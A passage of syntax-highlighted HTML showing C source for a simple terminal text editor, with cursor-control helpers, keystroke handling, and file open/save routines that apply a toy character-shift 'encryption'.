class=\"o\">&lt;=</span><span class=\"mi\">3000</span><span class=\"p\">;</span><span class=\"n\">i</span><span class=\"o\">++</span><span class=\"p\">)</span>\n    <span class=\"n\">width</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">]</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span>\n  <span class=\"n\">dstart</span><span class=\"o\">=</span><span class=\"mi\">1</span><span class=\"p\">;</span>\n  <span class=\"n\">format</span><span class=\"p\">();</span>\n<span class=\"p\">}</span>\n\n<span class=\"kt\">void</span> <span class=\"nf\">gotoxy</span><span class=\"p\">(</span><span class=\"kt\">int</span> <span class=\"n\">x</span><span class=\"p\">,</span><span class=\"kt\">int</span> <span class=\"n\">y</span><span class=\"p\">)</span>\n<span class=\"p\">{</span>\n   <span class=\"n\">printf</span><span class=\"p\">(</span><span class=\"s\">\"%c[%d;%df\"</span><span class=\"p\">,</span><span class=\"mh\">0x1B</span><span class=\"p\">,</span><span class=\"n\">y</span><span class=\"p\">,</span><span class=\"n\">x</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n\n<span class=\"kt\">void</span> <span class=\"nf\">clrscr</span><span class=\"p\">()</span>\n<span class=\"p\">{</span>\n  <span class=\"n\">printf</span><span class=\"p\">(</span><span class=\"s\">\"</span><span class=\"se\">\\033</span><span class=\"s\">c\"</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n\n<span class=\"kt\">int</span> <span class=\"nf\">getch</span><span class=\"p\">()</span>\n<span class=\"p\">{</span>\n    <span class=\"kt\">char</span> <span class=\"n\">ch</span><span class=\"p\">;</span>\n    <span class=\"n\">system</span><span class=\"p\">(</span><span class=\"s\">\"stty -echo -icanon\"</span><span class=\"p\">);</span>\n    <span class=\"n\">ch</span><span class=\"o\">=</span><span class=\"n\">getchar</span><span class=\"p\">();</span>\n    <span class=\"n\">system</span><span class=\"p\">(</span><span class=\"s\">\"stty echo icanon\"</span><span class=\"p\">);</span>\n    <span class=\"k\">return</span> <span class=\"n\">ch</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n\n<span class=\"kt\">void</span> <span class=\"nf\">fr</span><span class=\"p\">()</span>\n<span class=\"p\">{</span>\n  <span class=\"kt\">FILE</span> <span class=\"o\">*</span><span class=\"n\">fp</span><span class=\"p\">;</span>\n  <span class=\"kt\">int</span> <span class=\"n\">c</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"n\">r</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span>\n  <span class=\"kt\">int</span> <span class=\"n\">i</span><span class=\"p\">;</span>\n  <span class=\"kt\">char</span> <span class=\"n\">ch</span><span class=\"p\">;</span>\n  <span class=\"kt\">char</span> <span class=\"n\">fpath</span><span class=\"p\">[</span><span class=\"mi\">100</span><span class=\"p\">];</span>\n  <span class=\"n\">memset</span><span class=\"p\">(</span><span class=\"n\">fpath</span><span class=\"p\">,</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"k\">sizeof</span><span class=\"p\">(</span><span class=\"n\">fpath</span><span class=\"p\">));</span>\n  <span class=\"n\">clrscr</span><span class=\"p\">();</span>\n  <span class=\"n\">printf</span><span class=\"p\">(</span><span class=\"s\">\"[OPEN] Please input a number to decryption:\"</span><span class=\"p\">);</span>\n  <span class=\"n\">r</span><span class=\"o\">=</span><span class=\"n\">scanf</span><span class=\"p\">(</span><span class=\"s\">\"%d\"</span><span class=\"p\">,</span><span class=\"o\">&amp;</span><span class=\"n\">c</span><span class=\"p\">);</span>\n  <span class=\"k\">while</span><span class=\"p\">((</span><span class=\"n\">ch</span><span class=\"o\">=</span><span class=\"n\">getchar</span><span class=\"p\">())</span><span class=\"o\">!=</span><span class=\"sc\">'\\n'</span><span class=\"o\">&amp;&amp;</span><span class=\"n\">ch</span><span class=\"o\">!=</span><span class=\"n\">EOF</span><span class=\"p\">);</span>\n  <span class=\"n\">ch</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span>\n  <span class=\"k\">if</span> <span class=\"p\">((</span><span class=\"n\">r</span><span class=\"o\">!=</span><span class=\"mi\">1</span><span class=\"p\">))</span> <span class=\"p\">{</span><span class=\"n\">printf</span><span class=\"p\">(</span><span class=\"s\">\"Error!</span><span class=\"se\">\\n</span><span class=\"s\">\"</span><span class=\"p\">);</span><span class=\"n\">getch</span><span class=\"p\">();</span><span class=\"n\">getch</span><span class=\"p\">();</span><span class=\"n\">clrscr</span><span class=\"p\">();</span><span class=\"k\">return</span><span class=\"p\">;}</span>\n  <span class=\"n\">r</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span>\n\n  <span class=\"n\">printf</span><span class=\"p\">(</span><span class=\"s\">\"[OPEN] Please input the file path:\"</span><span class=\"p\">);</span>\n  <span class=\"n\">scanf</span><span class=\"p\">(</span><span class=\"s\">\"%s\"</span><span class=\"p\">,</span><span class=\"n\">fpath</span><span class=\"p\">);</span>\n  <span class=\"k\">if</span> <span class=\"p\">((</span><span class=\"n\">fp</span><span class=\"o\">=</span><span class=\"n\">fopen</span><span class=\"p\">(</span><span class=\"n\">fpath</span><span class=\"p\">,</span><span class=\"s\">\"r\"</span><span class=\"p\">))</span><span class=\"o\">==</span><span class=\"nb\">NULL</span><span class=\"p\">)</span>\n  <span class=\"p\">{</span>\n  <span class=\"n\">printf</span><span class=\"p\">(</span><span class=\"s\">\"Can't open the file!\"</span><span class=\"p\">);</span>\n  <span class=\"n\">getch</span><span class=\"p\">();</span>\n  <span class=\"n\">getch</span><span class=\"p\">();</span>\n  <span class=\"n\">clrscr</span><span class=\"p\">();</span>\n  <span class=\"k\">return</span><span class=\"p\">;</span>\n  <span class=\"p\">}</span>\n  <span class=\"n\">init</span><span class=\"p\">();</span>\n  <span class=\"n\">i</span><span class=\"o\">=</span><span class=\"mi\">1</span><span class=\"p\">;</span>\n  <span class=\"k\">while</span> <span class=\"p\">((</span><span class=\"n\">ch</span><span class=\"o\">=</span><span class=\"n\">getc</span><span class=\"p\">(</span><span class=\"n\">fp</span><span class=\"p\">))</span><span class=\"o\">!=</span><span class=\"n\">EOF</span><span class=\"p\">)</span>\n  <span class=\"p\">{</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">i</span><span class=\"o\">&gt;</span><span class=\"n\">maxlen</span><span class=\"p\">)</span> <span class=\"k\">break</span><span class=\"p\">;</span>\n    <span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">]</span><span class=\"o\">=</span><span class=\"n\">ch</span><span class=\"o\">+</span><span class=\"n\">c</span><span class=\"p\">;</span>\n    <span class=\"n\">i</span><span class=\"o\">++</span><span class=\"p\">;</span>\n  <span class=\"p\">}</span>\n  <span class=\"n\">fclose</span><span class=\"p\">(</span><span class=\"n\">fp</span><span class=\"p\">);</span>\n  <span class=\"n\">printf</span><span class=\"p\">(</span><span class=\"s\">\"Read the file successful!\"</span><span class=\"p\">);</span>\n  <span class=\"n\">getch</span><span class=\"p\">();</span>\n  <span class=\"n\">getch</span><span class=\"p\">();</span>\n  <span class=\"n\">clrscr</span><span class=\"p\">();</span>\n  <span class=\"k\">return</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n<span class=\"kt\">void</span> <span class=\"nf\">fw</span><span class=\"p\">()</span>\n<span class=\"p\">{</span>\n  <span class=\"kt\">FILE</span> <span class=\"o\">*</span><span class=\"n\">fp</span><span class=\"p\">;</span>\n  <span class=\"kt\">char</span> <span class=\"n\">fpath</span><span class=\"p\">[</span><span class=\"mi\">100</span><span class=\"p\">];</span>\n  <span class=\"kt\">int</span> <span class=\"n\">i</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span>\n  <span class=\"kt\">int</span> <span class=\"n\">c</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"n\">r</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span>\n  <span class=\"kt\">char</span> <span class=\"n\">ch</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span>\n  <span class=\"n\">memset</span><span class=\"p\">(</span><span class=\"n\">fpath</span><span class=\"p\">,</span><span class=\"mi\">0</span><span class=\"p\">,</span><span class=\"k\">sizeof</span><span class=\"p\">(</span><span class=\"n\">fpath</span><span class=\"p\">));</span>\n  <span class=\"n\">clrscr</span><span class=\"p\">();</span>\n  <span class=\"n\">printf</span><span class=\"p\">(</span><span class=\"s\">\"[SAVE] Please input a number to encrypt:\"</span><span class=\"p\">);</span>\n  <span class=\"n\">r</span><span class=\"o\">=</span><span class=\"n\">scanf</span><span class=\"p\">(</span><span class=\"s\">\"%d\"</span><span class=\"p\">,</span><span class=\"o\">&amp;</span><span class=\"n\">c</span><span class=\"p\">);</span>\n  <span class=\"k\">while</span><span class=\"p\">((</span><span class=\"n\">ch</span><span class=\"o\">=</span><span class=\"n\">getchar</span><span class=\"p\">())</span><span class=\"o\">!=</span><span class=\"sc\">'\\n'</span><span class=\"o\">&amp;&amp;</span><span class=\"n\">ch</span><span class=\"o\">!=</span><span class=\"n\">EOF</span><span class=\"p\">);</span>\n  <span class=\"n\">ch</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span>\n  <span class=\"k\">if</span> <span class=\"p\">((</span><span class=\"n\">r</span><span class=\"o\">!=</span><span class=\"mi\">1</span><span class=\"p\">))</span> <span class=\"p\">{</span><span class=\"n\">printf</span><span class=\"p\">(</span><span class=\"s\">\"Error!</span><span class=\"se\">\\n</span><span class=\"s\">\"</span><span class=\"p\">);</span><span class=\"n\">getch</span><span class=\"p\">();</span><span class=\"n\">getch</span><span class=\"p\">();</span><span class=\"n\">clrscr</span><span class=\"p\">();</span><span class=\"k\">return</span><span class=\"p\">;}</span>\n  <span class=\"n\">r</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span>\n  <span class=\"n\">printf</span><span class=\"p\">(</span><span class=\"s\">\"[SAVE] Please input the file path:\"</span><span class=\"p\">);</span>\n  <span class=\"n\">scanf</span><span class=\"p\">(</span><span class=\"s\">\"%s\"</span><span class=\"p\">,</span><span class=\"n\">fpath</span><span class=\"p\">);</span>\n  <span class=\"k\">if</span> <span class=\"p\">((</span><span class=\"n\">fp</span><span class=\"o\">=</span><span class=\"n\">fopen</span><span class=\"p\">(</span><span class=\"n\">fpath</span><span class=\"p\">,</span><span class=\"s\">\"w\"</span><span class=\"p\">))</span><span class=\"o\">==</span><span class=\"nb\">NULL</span><span class=\"p\">)</span>\n  <span class=\"p\">{</span>\n  <span class=\"n\">printf</span><span class=\"p\">(</span><span class=\"s\">\"Can't open file!\"</span><span class=\"p\">);</span>\n  <span class=\"n\">getch</span><span class=\"p\">();</span>\n  <span class=\"n\">getch</span><span class=\"p\">();</span>\n  <span class=\"n\">clrscr</span><span class=\"p\">();</span>\n  <span class=\"n\">exit</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">);</span>\n  <span class=\"p\">}</span>\n  <span class=\"k\">for</span> <span class=\"p\">(</span><span class=\"n\">i</span><span class=\"o\">=</span><span class=\"mi\">1</span><span class=\"p\">;</span><span class=\"n\">i</span><span class=\"o\">&lt;=</span><span class=\"n\">sum</span><span class=\"p\">(</span><span class=\"n\">height</span><span class=\"p\">);</span><span class=\"n\">i</span><span class=\"o\">++</span><span class=\"p\">)</span>\n  <span class=\"p\">{</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">]</span><span class=\"o\">!=</span><span class=\"mi\">0</span><span class=\"p\">)</span>\n    <span class=\"n\">putc</span><span class=\"p\">(</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">i</span><span class=\"p\">]</span><span class=\"o\">-</span><span class=\"n\">c</span><span class=\"p\">,</span><span class=\"n\">fp</span><span class=\"p\">);</span>\n  <span class=\"p\">}</span>\n  <span class=\"n\">fclose</span><span class=\"p\">(</span><span class=\"n\">fp</span><span class=\"p\">);</span>\n  <span class=\"n\">printf</span><span class=\"p\">(</span><span class=\"s\">\"Write the file successful!\"</span><span class=\"p\">);</span>\n  <span class=\"n\">getch</span><span class=\"p\">();</span>\n  <span class=\"n\">getch</span><span class=\"p\">();</span>\n  <span class=\"n\">clrscr</span><span class=\"p\">();</span>\n  <span class=\"n\">exit</span><span class=\"p\">(</span><span class=\"mi\">0</span><span class=\"p\">);</span>\n<span class=\"p\">}</span>\n<span class=\"kt\">int</span> <span class=\"nf\">key</span><span class=\"p\">(</span><span class=\"kt\">char</span> <span class=\"n\">ch</span><span class=\"p\">)</span>\n<span class=\"p\">{</span>\n  <span class=\"kt\">char</span> <span class=\"n\">temp</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span>\n  <span class=\"k\">if</span> <span class=\"p\">(((</span><span class=\"n\">conv</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"p\">,</span><span class=\"n\">y</span><span class=\"p\">)</span><span class=\"o\">&gt;=</span><span class=\"n\">sum</span><span class=\"p\">(</span><span class=\"n\">height</span><span class=\"p\">))</span><span class=\"o\">&amp;&amp;</span><span class=\"p\">(</span><span class=\"n\">height</span><span class=\"o\">&lt;=</span><span class=\"n\">dheight</span><span class=\"p\">)</span><span class=\"o\">&amp;&amp;</span><span class=\"p\">(</span><span class=\"n\">y</span><span class=\"o\">&lt;=</span><span class=\"n\">dwidth</span><span class=\"p\">)))</span>\n  <span class=\"p\">{</span>\n    <span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">conv</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"p\">,</span><span class=\"n\">y</span><span class=\"p\">)]</span><span class=\"o\">=</span><span class=\"n\">ch</span><span class=\"p\">;</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">width</span><span class=\"p\">[</span><span class=\"n\">x</span><span class=\"p\">]</span><span class=\"o\">&lt;</span><span class=\"n\">dwidth</span><span class=\"p\">)</span> <span class=\"n\">width</span><span class=\"p\">[</span><span class=\"n\">x</span><span class=\"p\">]</span><span class=\"o\">++</span><span class=\"p\">;</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">y</span><span class=\"o\">&lt;</span><span class=\"n\">width</span><span class=\"p\">[</span><span class=\"n\">x</span><span class=\"p\">])</span> <span class=\"n\">y</span><span class=\"o\">=</span><span class=\"n\">y</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">;</span>\n    <span class=\"k\">else</span>\n    <span class=\"k\">if</span> <span class=\"p\">((</span><span class=\"n\">y</span><span class=\"o\">==</span><span class=\"n\">width</span><span class=\"p\">[</span><span class=\"n\">x</span><span class=\"p\">])</span><span class=\"o\">&amp;&amp;</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"o\">&lt;</span><span class=\"n\">dheight</span><span class=\"p\">))</span> <span class=\"p\">{</span><span class=\"n\">x</span><span class=\"o\">++</span><span class=\"p\">;</span><span class=\"n\">y</span><span class=\"o\">=</span><span class=\"mi\">1</span><span class=\"p\">;}</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">x</span><span class=\"o\">&gt;</span><span class=\"p\">(</span><span class=\"mi\">22</span><span class=\"o\">+</span><span class=\"n\">dstart</span><span class=\"p\">))</span> <span class=\"n\">dstart</span><span class=\"o\">++</span><span class=\"p\">;</span>\n    <span class=\"n\">format</span><span class=\"p\">();</span>\n    <span class=\"n\">prin</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">);</span>\n  <span class=\"p\">}</span>\n  <span class=\"k\">else</span>\n  <span class=\"p\">{</span>\n    <span class=\"k\">if</span> <span class=\"p\">((</span><span class=\"n\">height</span><span class=\"o\">&gt;</span><span class=\"n\">dheight</span><span class=\"p\">)</span><span class=\"o\">||</span><span class=\"p\">((</span><span class=\"n\">height</span><span class=\"o\">==</span><span class=\"n\">dheight</span><span class=\"p\">)</span><span class=\"o\">&amp;&amp;</span><span class=\"p\">(</span><span class=\"n\">width</span><span class=\"p\">[</span><span class=\"n\">height</span><span class=\"p\">]</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"o\">==</span><span class=\"n\">dwidth</span><span class=\"p\">)))</span> <span class=\"p\">;</span>\n    <span class=\"k\">else</span>\n    <span class=\"p\">{</span>\n    <span class=\"n\">push</span><span class=\"p\">(</span><span class=\"n\">conv</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"p\">,</span><span class=\"n\">y</span><span class=\"p\">));</span>\n    <span class=\"n\">temp</span><span class=\"o\">=</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">conv</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"p\">,</span><span class=\"n\">y</span><span class=\"p\">)];</span>\n    <span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">conv</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"p\">,</span><span class=\"n\">y</span><span class=\"p\">)]</span><span class=\"o\">=</span><span class=\"n\">ch</span><span class=\"p\">;</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">check</span><span class=\"p\">()</span><span class=\"o\">==</span><span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"p\">{</span><span class=\"n\">pull</span><span class=\"p\">(</span><span class=\"n\">conv</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"p\">,</span><span class=\"n\">y</span><span class=\"p\">));</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">conv</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"p\">,</span><span class=\"n\">y</span><span class=\"p\">)]</span><span class=\"o\">=</span><span class=\"n\">temp</span><span class=\"p\">;}</span>\n    <span class=\"k\">else</span>\n    <span class=\"p\">{</span>\n    <span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">conv</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"p\">,</span><span class=\"n\">y</span><span class=\"p\">)]</span><span class=\"o\">=</span><span class=\"n\">ch</span><span class=\"p\">;</span>\n    <span class=\"cm\">/*if (width[x]&lt;dwidth) width[x]++;\n    else\n    if ((width[x]==dwidth)&amp;&amp;(x&lt;=dheight)) {height++;x++;width[x]++;x--;}*/</span>\n    <span class=\"n\">format</span><span class=\"p\">();</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">y</span><span class=\"o\">&lt;</span><span class=\"n\">width</span><span class=\"p\">[</span><span class=\"n\">x</span><span class=\"p\">])</span> <span class=\"n\">y</span><span class=\"o\">=</span><span class=\"n\">y</span><span class=\"o\">+</span><span class=\"mi\">1</span><span class=\"p\">;</span>\n    <span class=\"k\">else</span> <span class=\"k\">if</span> <span class=\"p\">((</span><span class=\"n\">y</span><span class=\"o\">==</span><span class=\"n\">width</span><span class=\"p\">[</span><span class=\"n\">x</span><span class=\"p\">])</span><span class=\"o\">&amp;&amp;</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"o\">&lt;</span><span class=\"n\">dheight</span><span class=\"p\">))</span> <span class=\"p\">{</span><span class=\"n\">x</span><span class=\"o\">++</span><span class=\"p\">;</span><span class=\"n\">y</span><span class=\"o\">=</span><span class=\"mi\">1</span><span class=\"p\">;}</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">x</span><span class=\"o\">&gt;</span><span class=\"p\">(</span><span class=\"mi\">22</span><span class=\"o\">+</span><span class=\"n\">dstart</span><span class=\"p\">))</span> <span class=\"n\">dstart</span><span class=\"o\">++</span><span class=\"p\">;</span>\n    <span class=\"n\">prin</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">);</span>\n    <span class=\"p\">}</span>\n    <span class=\"p\">}</span>\n  <span class=\"p\">}</span>\n  <span class=\"k\">return</span> <span class=\"mi\">1</span><span class=\"p\">;</span>\n<span class=\"p\">}</span>\n<span class=\"kt\">int</span> <span class=\"nf\">ctrkey</span><span class=\"p\">(</span><span class=\"kt\">char</span> <span class=\"n\">ch</span><span class=\"p\">)</span>\n<span class=\"p\">{</span>\n  <span class=\"kt\">int</span> <span class=\"n\">temp</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">ch</span><span class=\"o\">==</span><span class=\"mi\">10</span><span class=\"p\">)</span>\n  <span class=\"p\">{</span>\n    <span class=\"k\">if</span> <span class=\"p\">((</span><span class=\"n\">conv</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"p\">,</span><span class=\"n\">y</span><span class=\"p\">)</span><span class=\"o\">&gt;=</span><span class=\"n\">sum</span><span class=\"p\">(</span><span class=\"n\">height</span><span class=\"p\">))</span><span class=\"o\">&amp;&amp;</span><span class=\"p\">(</span><span class=\"n\">height</span><span class=\"o\">&lt;</span><span class=\"n\">dheight</span><span class=\"p\">))</span>\n     <span class=\"p\">{</span>\n      <span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">conv</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"p\">,</span><span class=\"n\">y</span><span class=\"p\">)]</span><span class=\"o\">=</span><span class=\"sc\">'\\n'</span><span class=\"p\">;</span>\n      <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">x</span><span class=\"o\">&lt;</span><span class=\"n\">dheight</span><span class=\"p\">)</span> <span class=\"p\">{</span><span class=\"n\">x</span><span class=\"o\">++</span><span class=\"p\">;</span><span class=\"n\">y</span><span class=\"o\">=</span><span class=\"mi\">1</span><span class=\"p\">;}</span>\n      <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">x</span><span class=\"o\">&gt;</span><span class=\"p\">(</span><span class=\"mi\">22</span><span class=\"o\">+</span><span class=\"n\">dstart</span><span class=\"p\">))</span> <span class=\"n\">dstart</span><span class=\"o\">++</span><span class=\"p\">;</span>\n      <span class=\"n\">format</span><span class=\"p\">();</span>\n      <span class=\"n\">prin</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">);</span>\n      <span class=\"k\">return</span> <span class=\"mi\">1</span><span class=\"p\">;</span>\n    <span class=\"p\">}</span>\n    <span class=\"k\">else</span>\n    <span class=\"p\">{</span>\n       <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">height</span><span class=\"o\">&gt;=</span><span class=\"n\">dheight</span><span class=\"p\">)</span> <span class=\"p\">;</span>\n       <span class=\"k\">else</span>\n        <span class=\"p\">{</span>\n          <span class=\"n\">push</span><span class=\"p\">(</span><span class=\"n\">conv</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"p\">,</span><span class=\"n\">y</span><span class=\"p\">));</span>\n          <span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">conv</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"p\">,</span><span class=\"n\">y</span><span class=\"p\">)]</span><span class=\"o\">=</span><span class=\"sc\">'\\n'</span><span class=\"p\">;</span>\n          <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">x</span><span class=\"o\">&lt;</span><span class=\"n\">dheight</span><span class=\"p\">)</span> <span class=\"p\">{</span><span class=\"n\">x</span><span class=\"o\">++</span><span class=\"p\">;</span><span class=\"n\">y</span><span class=\"o\">=</span><span class=\"mi\">1</span><span class=\"p\">;}</span>\n          <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">x</span><span class=\"o\">&gt;</span><span class=\"p\">(</span><span class=\"mi\">22</span><span class=\"o\">+</span><span class=\"n\">dstart</span><span class=\"p\">))</span> <span class=\"n\">dstart</span><span class=\"o\">++</span><span class=\"p\">;</span>\n          <span class=\"n\">format</span><span class=\"p\">();</span>\n          <span class=\"n\">prin</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">);</span>\n          <span class=\"k\">return</span> <span class=\"mi\">1</span><span class=\"p\">;</span>\n        <span class=\"p\">}</span>\n    <span class=\"p\">}</span>\n  <span class=\"p\">}</span>\n  <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">ch</span><span class=\"o\">==</span><span class=\"mi\">127</span><span class=\"p\">)</span>\n  <span class=\"p\">{</span>\n  <span class=\"k\">if</span> <span class=\"p\">((</span><span class=\"n\">conv</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"p\">,</span><span class=\"n\">y</span><span class=\"p\">)</span><span class=\"o\">&gt;=</span><span class=\"n\">sum</span><span class=\"p\">(</span><span class=\"n\">height</span><span class=\"p\">)))</span>\n  <span class=\"p\">{</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">y</span><span class=\"o\">&gt;</span><span class=\"mi\">1</span><span class=\"p\">)</span>\n    <span class=\"p\">{</span>\n      <span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">conv</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"p\">,</span><span class=\"n\">y</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">)]</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span>\n      <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">y</span><span class=\"o\">&gt;</span><span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"p\">{</span><span class=\"n\">y</span><span class=\"o\">=</span><span class=\"n\">y</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">;</span><span class=\"n\">width</span><span class=\"p\">[</span><span class=\"n\">x</span><span class=\"p\">]</span><span class=\"o\">--</span><span class=\"p\">;}</span>\n      <span class=\"n\">format</span><span class=\"p\">();</span>\n      <span class=\"n\">prin</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">);</span>\n      <span class=\"k\">return</span> <span class=\"mi\">1</span><span class=\"p\">;</span>\n    <span class=\"p\">}</span>\n    <span class=\"k\">else</span>\n    <span class=\"k\">if</span> <span class=\"p\">((</span><span class=\"n\">y</span><span class=\"o\">==</span><span class=\"mi\">1</span><span class=\"p\">)</span><span class=\"o\">&amp;&amp;</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"o\">&gt;</span><span class=\"mi\">1</span><span class=\"p\">))</span> <span class=\"p\">{</span><span class=\"n\">a</span><span class=\"p\">[</span><span class=\"n\">conv</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"p\">,</span><span class=\"n\">y</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">)]</span><span class=\"o\">=</span><span class=\"mi\">0</span><span class=\"p\">;</span><span class=\"n\">temp</span><span class=\"o\">=</span><span class=\"n\">width</span><span class=\"p\">[</span><span class=\"n\">x</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">];</span><span class=\"n\">format</span><span class=\"p\">();</span><span class=\"n\">x</span><span class=\"o\">=</span><span class=\"n\">x</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">;</span><span class=\"n\">y</span><span class=\"o\">=</span><span class=\"n\">temp</span><span class=\"p\">;</span><span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">x</span><span class=\"o\">&lt;</span><span class=\"p\">(</span><span class=\"n\">dstart</span><span class=\"p\">))</span> <span class=\"n\">dstart</span><span class=\"o\">--</span><span class=\"p\">;</span><span class=\"n\">prin</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">);}</span>\n  <span class=\"p\">}</span>\n  <span class=\"k\">else</span>\n  <span class=\"p\">{</span>\n    <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">y</span><span class=\"o\">&gt;</span><span class=\"mi\">1</span><span class=\"p\">)</span>\n    <span class=\"p\">{</span>\n      <span class=\"n\">pull</span><span class=\"p\">(</span><span class=\"n\">conv</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"p\">,</span><span class=\"n\">y</span><span class=\"p\">));</span>\n      <span class=\"k\">if</span> <span class=\"p\">(</span><span class=\"n\">y</span><span class=\"o\">&gt;</span><span class=\"mi\">1</span><span class=\"p\">)</span> <span class=\"p\">{</span><span class=\"n\">y</span><span class=\"o\">=</span><span class=\"n\">y</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">;</span><span class=\"n\">width</span><span class=\"p\">[</span><span class=\"n\">x</span><span class=\"p\">]</span><span class=\"o\">--</span><span class=\"p\">;}</span>\n      <span class=\"n\">format</span><span class=\"p\">();</span>\n      <span class=\"n\">prin</span><span class=\"p\">(</span><span class=\"mi\">1</span><span class=\"p\">);</span>\n      <span class=\"k\">return</span> <span class=\"mi\">1</span><span class=\"p\">;</span>\n    <span class=\"p\">}</span>\n    <span class=\"k\">else</span>\n    <span class=\"k\">if</span> <span class=\"p\">((</span><span class=\"n\">y</span><span class=\"o\">==</span><span class=\"mi\">1</span><span class=\"p\">)</span><span class=\"o\">&amp;&amp;</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"o\">&gt;</span><span class=\"mi\">1</span><span class=\"p\">))</span> <span class=\"p\">{</span><span class=\"n\">pull</span><span class=\"p\">(</span><span class=\"n\">conv</span><span class=\"p\">(</span><span class=\"n\">x</span><span class=\"p\">,</span><span class=\"n\">y</span><span class=\"p\">));</span><span class=\"n\">temp</span><span class=\"o\">=</span><span class=\"n\">width</span><span class=\"p\">[</span><span class=\"n\">x</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">];</span><span class=\"n\">format</span><span class=\"p\">();</span><span class=\"n\">x</span><span class=\"o\">=</span><span class=\"n\">x</span><span class=\"o\">-</span><span class=\"mi\">1</span><span class=\"p\">;</span><span class=\"n\">y</span><span class=\"o\">=</span><span 